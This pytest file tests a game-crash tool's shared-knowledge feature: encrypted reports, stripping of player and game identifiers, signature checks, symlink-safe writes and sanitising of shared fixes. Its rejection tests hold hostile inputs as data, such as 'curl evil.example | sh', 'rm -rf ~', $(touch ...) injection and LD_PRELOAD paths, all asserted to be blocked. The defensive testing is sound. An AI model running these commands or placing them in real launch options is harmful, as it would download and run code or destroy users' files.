"""Everyone's crash knowledge (server/knowledge + ezgd/library/crowd.py): every report is sealed with a fresh key only
the server can open, nothing that identifies the player or the game leaves the computer, and what comes back is used
only when the server signed it — and even then cannot make this computer run anything."""

import base64
import json
import time

import pytest
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

from ezgd.core import crowd_keys, safefiles
from ezgd.library import crowd, tracer
from ezgd.net.client import FetchResult

from test_release_fixes import core  # noqa: F401 — the shared AppCore fixture

RAW = (serialization.Encoding.Raw, serialization.PublicFormat.Raw)


class FakeServer:
    """Opens reports the way the worker does (X25519 → HKDF → AES-GCM) and publishes signed knowledge."""

    def __init__(self):
        self.box = X25519PrivateKey.generate()
        self.signer = Ed25519PrivateKey.generate()
        self.enc = base64.b64encode(self.box.public_key().public_bytes(*RAW)).decode()
        self.sign = base64.b64encode(self.signer.public_key().public_bytes(*RAW)).decode()
        self.received: list[dict] = []
        self.entries: list[dict] = []

    def open(self, sealed: dict) -> dict:
        epk, nonce, ct = (base64.b64decode(sealed[k]) for k in ("epk", "nonce", "ct"))
        server = base64.b64decode(self.enc)
        shared = self.box.exchange(X25519PublicKey.from_public_bytes(epk))
        key = HKDF(algorithm=hashes.SHA256(), length=32, salt=epk + server, info=crowd.INFO).derive(shared)
        return json.loads(AESGCM(key).decrypt(nonce, ct, crowd.AAD))

    def published(self) -> bytes:
        doc = json.dumps({"v": 1, "generated": time.time(), "entries": self.entries})
        return json.dumps({"doc": doc, "sig": base64.b64encode(self.signer.sign(doc.encode())).decode()}).encode()

    async def fetch(self, url, *, method="GET", content=None, **_kw):
        if url.endswith("/v1/report") and method == "POST":
            sealed = json.loads(content)
            self.received.append(sealed)
            recs = self.open(sealed)["records"]
            return FetchResult(url, 200, {}, json.dumps({"kept": len(recs)}).encode())
        if url.endswith("/v1/knowledge"):
            return FetchResult(url, 200, {}, self.published())
        return FetchResult(url, 404, {}, b"")


SIG = {"engine": "Unreal Engine", "code": "c0000005", "module": "nvapi64.dll", "null": True, "replaced": [],
       "loaders": [], "box": "", "missing": [], "build": "secretgame-win64-shipping.exe:123:abc",
       "keys": ["software\\bandai namco\\secret game"]}
FIX = {"gen_id": "trace:nvapi-off", "label": "Turn off NVAPI", "why": "The crash in /home/me/Games/Secret Game …",
       "options": ["no_nvapi"]}


def test_each_report_has_its_own_key_and_only_the_server_opens_it():
    srv = FakeServer()
    a, b = crowd.seal({"v": 1, "x": "same"}, srv.enc), crowd.seal({"v": 1, "x": "same"}, srv.enc)
    assert a["epk"] != b["epk"] and a["ct"] != b["ct"]                    # a fresh random key every time
    assert srv.open(a) == {"v": 1, "x": "same"}
    other = FakeServer()
    with pytest.raises(Exception):
        other.open(a)                                                    # nobody else — not even another server
    bad = dict(a, ct=base64.b64encode(bytes([base64.b64decode(a["ct"])[0] ^ 1]) +
                                      base64.b64decode(a["ct"])[1:]).decode())
    with pytest.raises(Exception):
        srv.open(bad)                                                    # nor changed on the way


def test_nothing_that_names_the_player_or_the_game_is_sent():
    me = {"id": "abc123", "gpus": [{"vendor": "amd", "name": "Radeon RX 7900 XTX"}], "cpu": {"model": "Ryzen 9"},
          "kernel": "7.2", "os": "CachyOS"}
    solved = [{"sig": SIG, "game": "Secret Game", "fixes": [FIX, dict(FIX, gen_id="x", raw_options="curl x|sh")],
               "overrides": {"launch_args": "SECRET=1 %command%"}, "labels": ["Turn off NVAPI"],
               "machine": {"id": "abc123"}},
              {"sig": SIG, "game": "Their Game", "fixes": [FIX], "machine": {"id": "someone-else"}}]
    recs, ids = crowd.reports(solved, me, set())
    blob = json.dumps(recs)
    assert len(recs) == 1 and recs[0]["machine"] == {"gpu": "amd"}
    for secret in ("Secret Game", "secretgame", "bandai", "/home/me", "SECRET", "abc123", "Radeon", "Ryzen",
                   "CachyOS", "curl", "Their Game"):
        assert secret not in blob, secret
    assert crowd.reports(solved, me, set(ids)) == ([], [])                # sent once


def test_only_what_the_server_signed_is_used():
    srv = FakeServer()
    srv.entries = [{"sig": {k: v for k, v in SIG.items() if k not in ("build", "keys")},
                    "fix": dict(FIX, why=""), "n": 4, "last": 1, "vendors": {"amd": 4}},
                   {"sig": {"code": 1}, "fix": dict(FIX, gen_id="evil", env={"LD_PRELOAD": "/tmp/x.so"}), "n": 50,
                    "last": 1, "vendors": {}}]
    body = srv.published()
    doc = crowd.verify(body, srv.sign)
    recs = [tracer.clean_record(r) for r in crowd.records_from(doc)]
    assert [r["n"] for r in recs] == [4, 50] and recs[1]["fixes"] == []   # the poisoned fix is dropped
    assert crowd.verify(body, FakeServer().sign) is None                  # someone else's signature
    forged = json.loads(body)
    forged["doc"] = forged["doc"].replace('"n": 4', '"n": 400')
    assert crowd.verify(json.dumps(forged).encode(), srv.sign) is None


async def test_the_app_shares_and_learns_through_the_server(core, tmp_path, monkeypatch):  # noqa: F811
    srv = FakeServer()
    monkeypatch.setenv("EZGD_CROWD", "1")
    monkeypatch.setattr(crowd_keys, "SERVER", "https://knowledge.example")
    monkeypatch.setattr(crowd_keys, "ENCRYPT_KEY", srv.enc)
    monkeypatch.setattr(crowd_keys, "SIGN_KEY", srv.sign)
    monkeypatch.setattr(core.client, "fetch", srv.fetch)
    monkeypatch.setattr(core, "_memory_path", lambda: tmp_path / "mem.json")
    from ezgd.platform import machine
    (tmp_path / "mem.json").write_text(json.dumps({"solved": [
        {"sig": SIG, "game": "Secret Game", "fixes": [FIX], "machine": {"id": machine.profile().get("id")}}]}))
    assert await core._crowd_submit() == 1 and await core._crowd_submit() == 0      # once
    assert "Secret Game" not in json.dumps(srv.received)                             # sealed on the way
    assert srv.open(srv.received[0])["records"][0]["fix"]["gen_id"] == "trace:nvapi-off"

    srv.entries = [{"sig": {k: v for k, v in SIG.items() if k not in ("build", "keys")}, "fix": dict(FIX, why=""),
                    "n": 3, "last": time.time(), "vendors": {"amd": 2, "nvidia": 1}}]
    assert await core._crowd_refresh()
    recs = core._shared_records()
    assert len(recs) == 1 and recs[0]["n"] == 3
    exe = tmp_path / "Game.exe"
    exe.write_bytes(b"MZ")
    t = tracer.trace("ezgd:dump code=c0000005 module=nvapi64.dll offset=1234 access=read address=0\n", exe,
                     exit_code=5, seconds=900)
    got = tracer.recall(tmp_path / "empty.json", t, "Unreal Engine", "Another Game", shared=recs)
    assert got and got[0].fix.options == ["no_nvapi"] and "3 other computers" in got[0].why

    core._crowd_file().write_bytes(FakeServer().published())                         # swapped on disk
    assert core._shared_records() == []
    core.settings.set("share_knowledge", False)
    assert await core._crowd_submit() == 0 and not await core._crowd_refresh()


def test_links_planted_in_the_synced_folder_are_never_followed(tmp_path):
    folder = tmp_path / "share"
    folder.mkdir()
    victim = tmp_path / "bashrc"
    victim.write_text("mine")
    (folder / "pc.zip").symlink_to(victim)
    safefiles.write_file(folder, "pc.zip", b"data")
    assert victim.read_text() == "mine" and not (folder / "pc.zip").is_symlink()
    (folder / "x.zip").symlink_to(victim)
    assert safefiles.read_file(folder / "x.zip") is None
    linked = tmp_path / "linked"
    (tmp_path / "elsewhere").mkdir()
    linked.symlink_to(tmp_path / "elsewhere", target_is_directory=True)
    with pytest.raises(OSError):
        safefiles.write_file(linked, "pc.zip", b"data")


def test_what_someone_else_shares_cannot_run_anything():
    good = {"gen_id": "trace:nvapi-off", "label": "Turn off NVAPI", "why": "x", "options": ["no_nvapi"],
            "env": {"DXVK_FILTER_DEVICE_NAME": "GeForce RTX 3080 (Laptop)", "VKD3D_CONFIG": "nodxr"},
            "dll_overrides": {"dwmapi": "n,b"}, "args": "-dx11 -windowed", "winetricks": ["vcrun2022"],
            "compat_set": {"use_runtime": False}}
    evil = [{**good, "raw_options": "curl evil.example | sh; %command%"},
            {**good, "edits": [{"path": "/home/x/.bashrc", "kind": "keyval", "key": "a", "value": "b"}]},
            {**good, "env": {"LD_PRELOAD": "/tmp/evil.so"}},
            {**good, "env": {"DXVK_FILTER_DEVICE_NAME": "x$(touch /tmp/pwned)"}},
            {**good, "env": {"VK_ICD_FILENAMES": "/tmp/icd.json"}},
            {**good, "env": {"PROTON_LOG_DIR": "/home/x"}},
            {**good, "env": {"PROTON_REMOTE_DEBUG_CMD": "winecfg"}},
            {**good, "env": {"PROTON_AUDIO_CONVERT_BIN": "evil"}}, {**good, "env": {"SDL_DYNAMIC_API": "evil.so"}},
            {**good, "args": "-x; rm -rf ~"}, {**good, "args": "`id`"},
            {**good, "winetricks": ["../../evil"]}, {**good, "options": ["not-an-option"]},
            {**good, "dll_overrides": {"../x": "n"}}, {**good, "compat_set": {"use_runtime": "yes"}},
            {**good, "compat_set": {"fps_limit": 1}}]
    rec = {"sig": {"box": "x", "evil": "y"}, "game": "<b>Game</b>", "labels": ["L"], "fixes": [good] + evil,
           "overrides": {"launch_args": "evil %command%"}, "at": 1.0, "machine": {"id": "../x", "gpus": "no"},
           "n": 3}
    c = tracer.clean_record(rec)
    assert len(c["fixes"]) == 1 and c["fixes"][0]["env"] == good["env"] and c["fixes"][0]["options"] == ["no_nvapi"]
    assert "overrides" not in c and "evil" not in c["sig"] and c["game"] == "bGame/b" and c["n"] == 3
    assert c["machine"]["id"] == "" and c["machine"]["gpus"] == []
    assert tracer.clean_record("x") is None and tracer.clean_record({"sig": "x"}) is None


def test_the_exact_setup_of_a_game_is_only_reused_from_this_computer(tmp_path):
    exe = tmp_path / "Game.exe"
    exe.write_bytes(b"MZ")
    t = tracer.trace("ezgd:dump code=c0000005 module=nvapi64.dll offset=1234 access=read address=0\n", exe,
                     exit_code=5, seconds=900)
    planted = {"sig": tracer.fingerprint(t, "Unreal Engine"), "game": "Game", "fixes": [], "labels": ["evil"],
               "at": 1.0, "overrides": {"launch_args": "curl evil | sh; %command%"}, "machine": {}}
    assert tracer.recall(tmp_path / "own.json", t, "Unreal Engine", "Game", shared=[planted]) == []
    (tmp_path / "own.json").write_text(json.dumps({"solved": [planted]}))           # this computer's own memory
    assert tracer.recall(tmp_path / "own.json", t, "Unreal Engine", "Game")[0].overrides


def test_players_launch_lines_cannot_load_code():
    from ezgd.library import protondb
    for line in ("LD_PRELOAD=/usr/lib/x.so %command%", "VK_ICD_FILENAMES=/x.json %command%",
                 "LD_LIBRARY_PATH=/x %command%", "VK_INSTANCE_LAYERS=x %command%"):
        assert protondb.sanitize(line) is None, line
    ok = "__NV_PRIME_RENDER_OFFLOAD=1 __GLX_VENDOR_LIBRARY_NAME=nvidia %command%"
    assert protondb.sanitize(ok) == ok
